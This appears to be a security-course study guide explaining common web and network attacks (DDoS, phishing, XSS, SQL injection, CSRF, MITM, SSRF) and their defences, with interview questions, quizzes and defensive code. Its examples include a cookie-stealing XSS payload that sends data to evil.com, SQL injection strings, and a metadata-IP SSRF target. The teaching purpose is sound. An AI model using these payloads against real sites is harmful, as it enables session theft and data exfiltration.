# Common Attacks: DDoS, Phishing, XSS, SQL Injection

> **TL;DR**: The major attack classes — DDoS (availability), phishing/credential attacks (authentication), XSS and SQL injection (input trust), plus CSRF, MITM, and supply-chain attacks — each exploit a specific trust assumption, and each has a standard, layered mitigation.

## 1. Why Does This Exist?
Systems are built on assumptions: "the network is reachable," "the user is who they claim," "user input is data, not code." Every attack class is a violation of one of those assumptions, and understanding them is the *raison d'être* of the security part of this course — you can't defend what you can't enumerate. This section exists to give the canonical attack taxonomy (the OWASP Top 10 + network attacks) so engineers can: (1) recognize the attack when it happens, (2) pick the correct mitigation, and (3) answer the single most-common interview question — "how would you attack X, and how do you defend it?" Each attack is a study in trust boundaries: XSS betrays the *browser's* trust in the page, SQLi betrays the *database's* trust in the query, phishing betrays *user trust*, DDoS betrays *availability assumptions*.

## 2. How Does It Work?
- **DDoS** (Distributed DoS): a botnet floods a target with traffic — **volumetric** (UDP/ICMP floods saturate bandwidth), **protocol** (SYN flood exhausts connection state), **application** (HTTP floods hit the app layer) — to exhaust *availability*.
- **Phishing/social engineering**: attacker tricks a human into revealing credentials or taking action (malicious link, lookalike domain, pretexting); credential stuffing reuses leaked passwords.
- **XSS** (Cross-Site Scripting): attacker injects `<script>` into a page (stored, reflected, or DOM-based); the victim's *browser* executes it — session hijack, keylogging, defacement.
- **SQLi**: attacker injects SQL into a query built from user input → data exfiltration, bypass auth, RCE (stacked queries).
- **CSRF**: a malicious site triggers an authenticated request on your site (state-changing GET/POST with your cookie) — "ride the session."
- **MITM**: attacker interposes between parties — ARP spoofing (L2), rogue DHCP, DNS spoofing, TLS interception — to read/modify traffic.
- **Others**: SSRF, path traversal, clickjacking, IDOR, supply chain (malicious deps), race conditions.

## 3. When Is It Used?
- **DDoS**: extortion, hacktivism, competition takedown — targets any public service; the Cloudflare/AWS Shield/Azure DDoS business exists for it.
- **Phishing/credential**: the #1 initial-access vector (Verizon DBIR) — BEC (business email compromise), OAuth phishing, vishing.
- **XSS/SQLi**: web-app pentesting staples — appear in every OWASP Top 10; automated scanners find them by the thousand on legacy apps.
- **MITM**: public WiFi sniffing, DNS/ARP poisoning in the LAN, malicious proxies, TLS-stripping.
- **CSRF**: state-changing endpoints on sites with cookie auth + no CSRF token.
- **Supply chain**: dependency compromise (SolarWinds, Log4Shell-era 3rd-party libs) — increasingly the top 2020s attack vector.

## 4. Why Wasn't Another Approach Chosen?
- *Alternative: rely only on firewalls/network controls.* They can't stop app-layer attacks (XSS/SQLi ride legitimate HTTP; phishing never touches your infra) or attacks on *users*. You need *input validation, output encoding, identity, and education* — network controls are one layer, not the answer.
- *Alternative: "just use TLS everywhere."* TLS protects the *channel*, not the *application*: SQLi and XSS work fine over TLS (the payload is legitimate-looking HTTP). Crypto is a necessary but insufficient layer — attacks target interpretation, not transport.
- *Alternative: blacklist known bad inputs.* Attackers mutate payloads endlessly (encoding, case, comments); blacklists are bypassable. The secure design is *whitelist + parameterization + context-aware output encoding* — assume all input is hostile and only allow the known-good shape.
- *Alternative: trust the network (LAN == safe).* That assumption enabled ARP spoofing, rogue APs, and lateral movement; modern zero-trust rejects it. The evolution is from "perimeter trust" to "verify everything."

## 5. Intuition
Each attack is a **broken trust contract**:
- DDoS = someone floods the restaurant's entrance so no customer can get in (availability).
- Phishing = a fake waiter asks for your credit card and you hand it over (identity).
- XSS = you post a message with HTML in it and the next visitor's browser *renders it as code* — the page trusted input as markup.
- SQLi = the database asked "what's your name?" and you answered "name' OR '1'='1" — the query trusted your input as SQL.
- CSRF = you're logged in, and an *evil tab* you visited posts on your behalf with your cookie.
- MITM = the "postman" delivering your letters is actually an impostor reading and rewriting them.

## 6. Real-World Analogy
A **mail-order company with a form**. The form is your web app. DDoS = someone sends a million identical orders to clog the mailroom. Phishing = a fake catalog arrives that looks identical, asking for your payment details. XSS = a customer writes their address as `<form>` markup, and the printer *executes it* — printing a fake checkout on every other customer's order page. SQLi = a customer writes their name as `Robert'); DROP TABLE orders;--` and the clerk *runs it as a database command*. CSRF = you're already "logged in" at the company, so a virus you caught elsewhere mails an order in your name with your shipping label. The fix in every case is the same: *never trust the input; validate, encode, and separate data from commands.*

## 7. Formal Definition
- **DDoS**: coordinated DoS from many sources exhausting bandwidth/state/CPU; volumetric (bits), protocol (state), application (requests); measured in Gbps / Mpps / RPS.
- **Phishing**: social-engineering attack delivering a credential-harvesting lure; **BEC** = impersonating execs via email; **spear-phishing** = targeted; **vishing/smishing** = voice/SMS variants.
- **XSS**: injection of client-side scripts; **Stored** (persisted, hits many), **Reflected** (in a response), **DOM** (client-side sink). Root cause: unencoded untrusted data reaching an HTML/JS context.
- **SQLi**: injection into SQL via unsanitized input; classes: in-band (UNION/error), blind (boolean/time), out-of-band; parameterized queries eliminate it.
- **CSRF**: forged cross-site requests carrying the victim's ambient credentials; defense: CSRF tokens, SameSite cookies, double-submit.
- **MITM**: interception/modification between endpoints; defense: authentication (TLS certs, SSH host keys) — encryption without authentication is MITM-able.
- **SSRF**: server-side request forgery — the server fetches attacker-controlled URLs → internal access; **path traversal**, **IDOR** (insecure direct object reference).

## 8. Example
**SQLi worked.** A login query: `SELECT * FROM users WHERE user='<input>' AND pass='<input>'`. Attacker enters `admin'--` as user → query becomes `... WHERE user='admin'--' AND pass='...'` → the `--` comments out the password check → logged in as admin. The fix: parameterize → `WHERE user=? AND pass=?` (the DB treats the input as data, never code).

**Stored XSS.** User posts a comment containing `<script>fetch('https://evil.com?c='+document.cookie)</script>`. The site stores and re-renders it unescaped; every visitor's browser executes it → attacker harvests cookies (session hijack). Fix: HTML-encode on output (`&lt;script&gt;`) + CSP.

**SYN flood (protocol DDoS).** Attacker sends spoofed SYN packets; the server allocates a TCB per SYN and waits (backlog); the queue fills → legitimate connections refused. Fix: SYN cookies, half-open limits, rate limiting.

## 9. Internal Working
1. **DDoS anatomy**: botnet (Mirai IoT, malware) → command → flood. Layers of defense: **edge** (Cloudflare/AWS Shield absorbs, anycast), **L3/L4** (ACLs, rate limits, BGP blackholing), **L7** (WAF, bot management, CAPTCHA), **protocol** (SYN cookies).
2. **Phishing pipeline**: lure (email/site) → credential harvest → credential validation/ stuffing → account takeover → lateral movement. Defense: MFA (blocks most), sender auth (SPF/DKIM/DMARC), URL scanning, user training, breach monitoring.
3. **XSS lifecycle**: attacker input → stored/reflected → browser HTML parser interprets as JS → script runs with page origin → exfiltration. Defense: context-aware output encoding, CSP (default-src 'none'), HttpOnly cookies, sanitizers, DOMPurify.
4. **SQLi lifecycle**: user input → string concatenation → SQL parser executes injected clause → data leak/alter. Defense: parameterized statements/prepared statements, ORMs, least-privilege DB users, WAF, input validation.
5. **CSRF mechanism**: browser auto-attaches cookies to cross-site requests (without SameSite); a malicious page triggers POST/PUT/GET (image/script/form). Defense: SameSite=Lax/Strict, CSRF tokens, double-submit cookies, origin checks, no state-changing GET.
6. **MITM variants**: ARP spoofing (Part 05 — poison ARP cache), rogue DHCP (assign attacker gateway), DNS spoofing (fake records), TLS interception (rogue CA). Defense: DNSSEC/DNS-over-HTTPS, mTLS/cert pinning, encrypted everything, 802.1X for LAN.

## 10. Time Complexity / Effort
- **DDoS scale**: attacks now routinely 1-5+ Tbps; mitigation absorbs at the edge; cost = bandwidth + scrubbing infra.
- **XSS/SQLi**: found/shot in seconds by scanners; exploit chains in minutes; the *fix* is code discipline (validation/encoding), not a network change.
- **Phishing**: a campaign costs pennies per victim; the defense (MFA, training, monitoring) is the ROI — breach cost far exceeds prevention cost.
- **MITM**: cheap locally (ARP poison ~seconds), harder at scale (needs rogue CA/cert control) — which is why certificate validation is the crux.
- The recurring theme: attacks are cheap and fast; defenses must be *systemic* (design-time) not whack-a-mole.

## 11. Advantages
- **DDoS defenses**: mature edge products (Cloudflare/Shield) absorb GB-Tbps; anycast + BGP blackhole; SYN cookies are cheap.
- **Input-validation defenses**: parameterized queries and output encoding *eliminate* whole classes (not just mitigate) — the "fix the root, not the symptom" ideal.
- **MFA**: kills the overwhelming majority of credential attacks (phishing/stuffing) at ~zero UX cost with passkeys.
- **CSP/SameSite**: browser-native, low-cost hardening against XSS/CSRF.
- **Layered ("defense in depth")**: each layer (edge, network, app, host, user) independently raises the cost of compromise.

## 12. Disadvantages
- **Attackers evolve**: bypasses for every blacklist; DDoS grows faster than mitigation (reflection/amplification).
- **Human layer is weakest**: no technical control fully stops a determined social engineer; training has diminishing returns.
- **False sense of security**: "we have TLS/WAF/antivirus" ≠ secure — misconfig and legacy code persist.
- **Cost of defense**: edge DDoS protection, EDR, SIEM, and security staff are expensive; small orgs under-invest.
- **Compatibility friction**: SameSite/CSP break legacy apps; strict validation can reject legitimate-but-weird input.

## 13. Interview Questions
1. **Q: What are the three types of DDoS attacks?** A: Volumetric (saturate bandwidth — UDP/ICMP floods, amplification), protocol/state-exhaustion (SYN flood fills connection tables), application-layer (HTTP floods exhaust CPU/DB). Defense layers: edge scrubbing (Cloudflare/Shield), rate limiting, SYN cookies, WAF/bot management.

2. **Q: How does a SYN flood work and how do SYN cookies fix it?** A: Attacker sends spoofed SYNs; the server allocates half-open connection state per SYN, exhausting the backlog. SYN cookies eliminate server-side state: the server encodes the connection parameters into the initial sequence number, which the client must return — no table to fill, only valid handshakes proceed.

3. **Q: What is XSS and what are its three types?** A: Injection of client-side scripts. Stored (persisted server-side, hits all visitors), Reflected (echoed in a response from crafted input), DOM-based (executed by client-side JS sinks without touching the server). Impact: session hijack, keylogging, defacement.

4. **Q: How do you prevent XSS?** A: (1) Context-aware output encoding (HTML, attribute, JS, URL contexts differ); (2) input validation/allow-listing; (3) CSP header (limit script sources); (4) HttpOnly cookies (keep session out of JS); (5) sanitizers (DOMPurify) where HTML is legitimately accepted. Never disable on untrusted input.

5. **Q: What is SQL injection and how do you prevent it?** A: User input concatenated into SQL becomes executable code. Prevention: parameterized/prepared statements (the database binds input as data), ORMs, least-privilege DB accounts, input validation, WAF as a backstop. `' OR '1'='1` and UNION-based extraction are the canonical payloads.

6. **Q: TRICKY — Why don't parameterized queries have a performance problem?** A: They often *help*: prepared statements are compiled once and reused with bound parameters (no re-parse per execution), and they eliminate injection entirely. The perceived overhead is the parse/bind round trip, amortized by statement caching — safety is effectively free.

7. **Q: What is CSRF and what defenses work?** A: A malicious site triggers an authenticated request on your app using the victim's ambient cookie. Defenses: SameSite=Lax/Strict cookies, CSRF tokens (random per-session value validated server-side), double-submit cookies, origin/referer checks, and never using GET for state changes.

8. **Q: What's the difference between reflected and stored XSS in terms of impact?** A: Stored persists and hits every visitor (higher impact, one payload many victims); reflected requires the victim to click a crafted link (self-XSS-like, but exploitable at scale via email/URL shorteners). Both execute in the victim's browser with the site's origin.

9. **Q: PRODUCTION — You're asked to secure a public login API against credential stuffing. What do you do?** A: MFA/passkeys (the real fix), breach-password detection at signup/login, device/risk-based authentication, rate limiting + CAPTCHA on login, anomaly detection (impossible travel, new device fingerprint), and monitoring for stuffing patterns (burst login failures).

10. **Q: What is a phishing-resistant MFA?** A: WebAuthn/FIDO2 passkeys: the credential is a public/private key pair bound to the *origin* (the site), so even a perfect fake login page can't capture a replayable secret — no OTP or password to phish. TOTP (Google Authenticator-style) is vulnerable to real-time phishing (evilginx); passkeys are not.

11. **Q: What is SSRF and why is it dangerous?** A: Server-Side Request Forgery — an app fetches a URL from user input (webhooks, image proxying, previews); the attacker points it at `http://169.254.169.254/` (cloud metadata), internal services, or the filesystem → reads secrets, reaches internal network. Defense: allow-list destinations, block private ranges/metadata IPs, DNS rebinding protection, no-credential fetching by default.

12. **Q: TRICKY — TLS encrypts everything, so how do XSS/SQLi still work?** A: TLS protects the *channel*, but the *application* processes the decrypted plaintext. XSS and SQLi are legitimate-looking HTTP requests carrying malicious payloads — TLS faithfully encrypts and delivers them. Application-layer trust (validation/encoding) is orthogonal to transport security.

13. **Q: What is a MITM attack and what are the LAN-level variants?** A: Interposition between client and server. LAN variants: ARP spoofing (poison ARP cache so frames route through the attacker), rogue DHCP (attacker's gateway), DNS spoofing, evil-twin WiFi. Defenses: TLS with proper cert validation, DNSSEC/DOH, 802.1X port security, mTLS for high-value traffic.

14. **Q: What is BEC (Business Email Compromise)?** A: An attacker impersonates an executive/partner via email to authorize a fraudulent transfer or data request — a *phishing variant with financial motive*. Defense: SPF/DKIM/DMARC sender auth, out-of-band verification for transfers, and training on urgency cues.

15. **Q: SCENARIO — Your site is defaced and the DB leaked. Which attacks, in what order, are most likely?** A: Probably SQLi or an exposed admin endpoint (unauthorized access → deface = integrity, leak = confidentiality), or a compromised credential (phishing/stuffing) reaching an over-privileged account. The response: contain (isolate), preserve evidence, rotate all secrets, audit for the entry vector, patch, and notify per regulatory obligations.

16. **Q: What is the OWASP Top 10 and why does it matter?** A: The OWASP Top 10 is a periodically updated list of the most critical web-application security risks (currently including broken access control, crypto failures, injection, XSS, SSRF, insecure design). It's the de-facto checklist for app security and a frequent interview reference point.

17. **Q: What is a supply-chain attack?** A: Compromising a trusted dependency/build pipeline to inject malicious code into software your target runs (SolarWinds, Log4Shell-era libs, NPM typosquatting). Defense: SBOM, dependency pinning + lockfiles, signed artifacts, reproducible builds, and least-privilege CI/CD.

18. **Q: PRODUCTION — Design DDoS protection for a global API.** A: (1) Edge CDN/anycast absorbs volumetric floods (Cloudflare/Shield — capacity in the Tbps); (2) L3/L4: BGP blackhole/RTBH for worst-case, rate limits, SYN cookies; (3) L7: WAF + bot management + rate limiting per IP/key + CAPTCHA; (4) scale-out stateless API behind LB so app floods don't exhaust one box; (5) monitoring + autoscale + scrubbing centers. Measure in Gbps, Mpps, RPS.

## 14. Follow-Up Questions
1. **Q: What is the difference between a blacklist and a whitelist for input validation?** A: Blacklists reject known-bad patterns (bypassable via encoding/mutation); whitelists accept only known-good shapes (type, length, charset, regex) — whitelists are the secure choice. Combine with output encoding for defense in depth.

2. **Q: What is an "evil twin" WiFi attack?** A: A rogue AP broadcasting the same SSID with higher power; clients auto-connect; the attacker MITMs everything. Defense: 802.1X/WPA3-Enterprise with certificate validation, and TLS with pinning so MITM can't read even the traffic.

3. **Q: What is the difference between reflected XSS and DOM XSS?** A: Reflected: server echoes input into HTML → browser executes on load. DOM: client-side JS reads attacker-controlled input (location.hash, postMessage) and writes it into an unsafe sink (innerHTML) — no server round trip. Both need context-aware client-side hardening.

4. **Q: How does DNS spoofing/poisoning work and how is DNSSEC the fix?** A: An attacker injects fake DNS records (cache poisoning) so a victim resolves evil.com as their bank. DNSSEC signs records with the chain of trust so resolvers can verify authenticity — eliminating the poisoning class (at the cost of DNS latency and key management).

## 15. Coding Example
```python
# SQLi demonstration + the parameterized fix (conceptual SQL)
# UNSAFE:
#   query = "SELECT * FROM users WHERE user='" + user_input + "' AND pass='" + pw + "'"
# SAFE (parameterized — input is data, never code):
#   SELECT * FROM users WHERE user=? AND pass=?   # bind params

# XSS: output encoding (the essence of the fix)
import html
def render_comment(user_input: str) -> str:
    return f"<div>{html.escape(user_input, quote=True)}</div>"  # <script> stays text
print(render_comment("<script>steal()</script>"))

# DDoS-style rate limiter sketch (token bucket)
import time
class TokenBucket:
    def __init__(self, rate, capacity):
        self.rate, self.cap = rate, capacity
        self.tokens, self.last = capacity, time.monotonic()
    def allow(self):
        now = time.monotonic()
        self.tokens = min(self.cap, self.tokens + (now - self.last) * self.rate)
        self.last = now
        if self.tokens >= 1:
            self.tokens -= 1
            return True
        return False

b = TokenBucket(rate=10, capacity=20)   # 10 req/s burst 20
print("allowed:", [b.allow() for _ in range(5)])
```
```bash
# Observe attacks/defenses in production logs
sudo journalctl -u sshd --since today | grep "Failed password" | head     # credential stuffing
grep -c "Unrecognized path\|alert" /var/log/nginx/error.log 2>/dev/null
sudo tail -20 /var/log/auth.log                                           # auth anomalies
ss -t state syn-recv | wc -l                                              # half-open SYNs (SYN flood signal)
# Check SPF/DKIM/DMARC for an inbound domain (phishing sender auth):
dig TXT _spf.google.com +short | head -1
dig TXT _dmarc.google.com +short | head -1
# HTTP security headers a site SHOULD send:
curl -sI https://github.com | grep -iE "content-security-policy|x-frame-options|strict-transport-security"
```

## 16. Industry Usage
- **DDoS**: Cloudflare, AWS Shield Advanced, Google Cloud Armor, Azure DDoS — the edge-mitigation industry.
- **Web app security**: WAFs (Cloudflare/ModSecurity/AWS WAF), SAST/DAST (Semgrep, OWASP ZAP), and CSP tooling in every web stack.
- **Phishing**: Microsoft Defender/Google Workspace sender auth (SPF/DKIM/DMARC), Okta/CrowdStrike threat monitoring, passkey rollouts (Apple/Google/Microsoft).
- **Identity & access**: MFA-first platforms (Okta, Keycloak, Auth0), zero-trust gateways.
- **Bug bounty/pentest**: HackerOne/Bugcrowd — the constant pressure-test of the OWASP classes.
- **Incident response**: every breach postmortem maps to this taxonomy (credential phishing → lateral movement → exfiltration).

## 17. References
- OWASP Top 10 (2021) — https://owasp.org/Top10/
- OWASP XSS Prevention / SQL Injection Cheat Sheets — https://cheatsheetseries.owasp.org/
- Verizon DBIR (Data Breach Investigations Report) — https://www.veriscommunity.com/dbir
- Cloudflare DDoS threat reports — https://blog.cloudflare.com/tag/ddos/
- RFC 4987 (TCP SYN flood defenses) — https://datatracker.ietf.org/doc/html/rfc4987
- MITRE ATT&CK — https://attack.mitre.org/
- PortSwigger Web Security Academy (XSS/SQLi/CSRF labs) — https://portswigger.net/web-security

## 18. Cheat Sheet
- DDoS: volumetric (bandwidth), protocol (state — SYN flood), application (HTTP). Fix: edge scrubbing + SYN cookies + rate limits + WAF.
- Phishing: human-targeted credential theft; fix: MFA/passkeys, SPF/DKIM/DMARC, training, breach monitoring.
- XSS: script injected into HTML; stored/reflected/DOM; fix: output encoding + CSP + HttpOnly.
- SQLi: input concatenated into SQL; fix: parameterized queries (input = data, never code).
- CSRF: cross-site forged request with ambient cookie; fix: SameSite + CSRF tokens.
- MITM: ARP/DNS/evil-twin; fix: validated TLS, DNSSEC/DOH, 802.1X, mTLS.
- SSRF: server fetches attacker-controlled URL; fix: allow-list, block metadata/private ranges.
- TLS protects the channel, not the app — input validation is orthogonal.
- Layered defense: edge → network → app → host → human; no single control suffices.
- OWASP Top 10 = the interview/app-security checklist.

## 19. Quiz
1. SYN flood is a: a) volumetric attack b) protocol/state attack c) app attack d) phishing → **b**
2. SYN cookies defend by: a) more memory b) removing server state c) blocking IPs d) encryption → **b**
3. XSS executes: a) SQL b) scripts in the victim's browser c) server code d) DNS queries → **b**
4. SQLi is prevented by: a) HTTPS b) parameterized queries c) WAF only d) CSP → **b**
5. CSRF is mitigated by: a) HttpOnly b) SameSite cookies + CSRF tokens c) TLS d) CAPTCHA → **b**
6. Stored XSS differs from reflected by: a) persistence b) payload c) channel d) victim → **a**
7. Phishing-resistant MFA: a) TOTP b) SMS OTP c) passkeys (WebAuthn) d) security questions → **c**
8. SSRF targets: a) the browser b) the server fetching attacker URLs c) the DB d) DNS → **b**

**Answers**: 1-b, 2-b, 3-b, 4-b, 5-b, 6-a, 7-c, 8-b.

## 20. Flashcards
- **Q: Three DDoS types?** → **A:** Volumetric, protocol (SYN flood), application (HTTP); defended at edge + rate limits + SYN cookies + WAF.
- **Q: How do SYN cookies work?** → **A:** Encode connection state in the ISN — no half-open table; only valid handshakes proceed.
- **Q: XSS types and fix?** → **A:** Stored/reflected/DOM; context-aware output encoding + CSP + HttpOnly.
- **Q: SQLi root cause and fix?** → **A:** Input concatenated into SQL; parameterized statements (data ≠ code).
- **Q: CSRF defense?** → **A:** SameSite cookies + CSRF tokens + no state-changing GET.
- **Q: Why doesn't TLS stop XSS/SQLi?** → **A:** They're app-layer interpretation attacks on legitimate-looking encrypted traffic.
- **Q: Best credential defense?** → **A:** MFA/passkeys (phishing-resistant), plus breach monitoring + anomaly detection.

## 21. Revision
Attacks exploit trust assumptions. DDoS: volumetric/protocol/app — edge scrubbing, SYN cookies, rate limits, WAF. Phishing: human vector — MFA/passkeys, SPF/DKIM/DMARC, training. XSS: script injection into HTML — output encoding + CSP + HttpOnly. SQLi: injection into SQL — parameterized queries. CSRF: ambient-cookie forged requests — SameSite + tokens. MITM: ARP/DNS/evil-twin — validated TLS, DNSSEC, 802.1X. SSRF: server fetches attacker URLs — allow-lists, block metadata. The unifying principle: *never trust input; separate data from code at every interpreter boundary* (HTML, SQL, URLs), authenticate the channel AND the endpoint, and defend in layers. TLS protects the pipe, not the app. OWASP Top 10 = the checklist.

## 22. What Interview Questions Come From This Section?
| Interview question | Source section |
|---|---|
| "Three DDoS types / how to defend" | 13-Q1,18 |
| "How do SYN floods and SYN cookies work?" | 13-Q2 |
| "What is XSS / types / prevention" | 13-Q3,4,8 |
| "SQLi mechanism and fix" | 13-Q5,6 |
| "What is CSRF and its defenses?" | 13-Q7 |
| "Credential stuffing defense" | 13-Q9 |
| "Phishing-resistant MFA" | 13-Q10 |
| "What is SSRF?" | 13-Q11 |
| "Why doesn't TLS stop XSS/SQLi?" | 13-Q12 |
| "MITM variants and defenses" | 13-Q13 |
| "Design DDoS protection" | 13-Q18 |
